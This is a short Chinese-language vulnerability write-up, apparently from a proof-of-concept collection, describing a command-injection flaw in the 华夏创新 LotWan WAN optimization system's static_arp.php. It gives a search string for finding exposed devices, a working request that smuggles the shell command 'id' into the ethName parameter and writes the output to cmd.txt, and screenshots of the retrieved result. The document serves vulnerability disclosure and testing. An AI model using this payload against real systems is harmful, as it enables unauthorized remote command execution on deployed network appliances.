# 华夏创新 LotWan广域网优化系统 static_arp.php 远程命令执行漏洞

## 漏洞描述

华夏创新 LotWan广域网优化系统 static_arp.php文件参数 ethName存在命令拼接，导致远程命令执行漏洞

## 漏洞影响

<a-checkbox checked>华夏创新 LotWan广域网优化系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="LotWan 广域网优化系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1635942598942-6671fa50-5052-43f6-ab40-bf2c8403bdf8-20220314123722094.png)

存在漏洞的文件为

```php
/acc/bindipmac/static_arp.php?ethName=||id>cmd.txt||
```

![img](../../../.vuepress/public/img/1635942680846-eb442f59-4229-43ad-a133-5c5587d20774.png)

再访问 `/acc/bindipmac/cmd.txt`

![img](../../../.vuepress/public/img/1635942700371-15189d95-a643-4b0d-95bb-14f6285796d2.png)

